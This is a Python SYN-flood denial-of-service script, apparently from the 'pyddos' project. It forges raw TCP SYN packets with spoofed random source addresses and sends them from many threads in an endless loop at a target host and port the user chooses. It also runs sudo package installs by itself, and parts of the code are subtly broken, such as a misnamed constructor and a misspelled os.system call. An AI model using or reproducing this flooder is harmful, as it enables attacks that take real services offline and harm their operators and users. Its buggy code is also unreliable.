#!/usr/bin/env python2

import urllib.parse
import http.client
from argparse import ArgumentParser, RawTextHelpFormatter
from threading import *
from struct import *
from socket import *
from random import *
import signal
import string
import time
import json
import sys
import os
version = '2.0'
title = '''

      _ \        _ \  _ \               _|           _)       |   
     |   | |   | |   | |   |  _ \   _| \_ \   _|  _| | _ \  __|  
     _/  |   | |   | |   | (   |\__ \       | (    |    | |   | |   
    |    \, |_/ _/ \_/ __/ __/ \__||   | ./ \_|  
           __/                                            _|         
                                                                    
 DDos python script | Script used for testing ddos | Ddos attack     
 Author: __T7hM1__                                                
 Github: http://github.com/t7hm1/pyddos                             
 Version:'''+version+''' 
'''


if os.name == 'posix':
    c = os.system('which pip3')
    if c == 256:
        os.system('sudo apt-get install python3-pip')
    else:
        pass
else:
    print('[-] Check your pip installer')

try:
    import requests
    import colorama
    from termcolor import colored, cprint
except:
    try:
        if os.name == 'posix':
            os.system('sudo pip3 install colorama termcolor requests')
            sys.exit('[+] I have installed nessecary modules for you')
        elif os.name == 'nt':
            os.sytem(
                'c:\python27\scripts\pip.exe install colorama requests termcolor')
            sys.exit('[+] I have installed nessecary modules for you')
        else:
            sys.exit('[-] Download and install nessecary modules')
    except Exception as e:
        print('[-]', e)
if os.name == 'nt':
    colorama.init()

signal.signal(signal.SIGPIPE, signal.SIG_DFL)


def fake_ip():
    skip = '127'
    rand = list(range(4))
    for x in range(4):
        rand[x] = randrange(0, 256)
    if rand[0] == skip:
        fake_ip()
    fkip = '%d.%d.%d.%d' % (rand[0], rand[1], rand[2], rand[3])
    return fkip


def check_tgt(args):
    tgt = args.d
    try:
        ip = gethostbyname(tgt)
    except:
        sys.exit(cprint('[-] Can\'t resolve host:Unknow host!', 'red'))
    return ip


def add_useragent():
    uagents = []
    uagents.append(
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36')
    uagents.append(
        '(Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36')
    uagents.append(
        'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25')
    uagents.append(
        'Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50')
    uagents.append('Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)')
    uagents.append(
        'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0')
    uagents.append('Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
    uagents.append(
        'Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)')
    return uagents


def add_bots():
    bots = []
    bots.append('http://www.bing.com/search?q=%40&count=50&first=0')
    bots.append(
        'http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8')
    return bots


class Synflood(Thread):
    def _init_(self, t_ip, t_port, s_ip, s_port):
        Thread._init_(self)
        self.t_ip = t_ip
        self.t_port = t_port
        self.s_ip = s_ip
        self.s_port = s_port
        self.psh = ''
        self.sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
        self.sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
        self.packet = self.Building_packet()

    def checksum(self):
        s = 0
        for i in range(0, len(self.psh), 2):
            w = (ord(chr(self.psh[i])) << 8) + (ord(chr(self.psh[i+1])))
            s = s+w

        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff

        return s

    def Building_packet(self):
        ihl = 5
        version = 4
        tos = 0
        tot = 40
        id = self.s_port
        frag_off = 0
        ttl = 64
        protocol = IPPROTO_TCP
        check = 10
        s_addr = inet_aton(self.s_ip)
        d_addr = inet_aton(self.t_ip)

        ihl_version = (version << 4) + ihl
        ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot,
                         id, frag_off, ttl, protocol, check, s_addr, d_addr)

        source = self.s_port
        dest = self.t_port
        seq = 0
        ack_seq = 0
        doff = 5
        fin = 0
        syn = 1
        rst = 0
        ack = 0
        psh = 0
        urg = 0
        window = htons(5840)
        check = 0
        urg_prt = 0

        offset_res = (doff << 4)
        tcp_flags = fin + (syn << 1) + (rst << 2) + \
            (psh << 3) + (ack << 4) + (urg << 5)
        tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq,
                          offset_res, tcp_flags, window, check, urg_prt)

        src_addr = inet_aton(self.s_ip)
        dst_addr = inet_aton(self.t_ip)
        place = 0
        protocol = IPPROTO_TCP
        tcp_length = len(tcp_header)

        self.psh = pack('!4s4sBBH', src_addr, dst_addr,
                        place, protocol, tcp_length)
        self.psh = self.psh + tcp_header

        tcp_checksum = self.checksum()

        tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq,
                          offset_res, tcp_flags, window, tcp_checksum, urg_prt)
        packet = ip_header + tcp_header

        return packet

    def run(self):
        while 1:
            # packet = self.Building_packet()
            try:
                self.sock.sendto(self.packet, (self.t_ip, 0))
            except KeyboardInterrupt:
                sys.exit(cprint('[-] Canceled by user', 'red'))
            except Exception as e:
                cprint(e, 'red')


def main():
    parser = ArgumentParser(
        usage='./%(prog)s -t [target] -p [port]',
        formatter_class=RawTextHelpFormatter,
        prog='SYNFloog.py',
        description=cprint(title, 'white', attrs=['bold']),
    )
    options = parser.add_argument_group('options', '')
    options.add_argument('-d', metavar='<ip|domain>', required=True,
                         help='Specify your target such an ip or domain name')
    options.add_argument('-t', metavar='<float>',
                         default=5.0, help='Set timeout for socket')
    options.add_argument('-p', metavar='<int>', default=80, help='Specify port target (default = 80)' +
                         colored(' |Only required with pyslow attack|', 'red'))
    args = parser.parse_args()

    add_bots()
    add_useragent()
    uid = os.getuid()
    if uid == 0:
        cprint('[*] You have enough permisson to run this script', 'green')
        time.sleep(0.5)
    else:
        sys.exit(
            cprint('[-] You haven\'t enough permission to run this script', 'red'))
    t_ip = check_tgt(args)
    synsock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
    synsock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
    ts = []
    threads = []
    print(colored('[*] Started SYN Flood: ', 'blue')+colored(t_ip, 'red'))
    try:
        s_ip = fake_ip()
        n_threads = os.cpu_count() * 10
        src_port_start = 50000
        for s_port in range(src_port_start, src_port_start + n_threads):
            thread = Synflood(t_ip, int(args.p), s_ip, s_port)
            thread.setDaemon(True)
            thread.start()
    except KeyboardInterrupt:
        sys.exit(cprint('[-] Canceled by user', 'red'))
    input()


main()
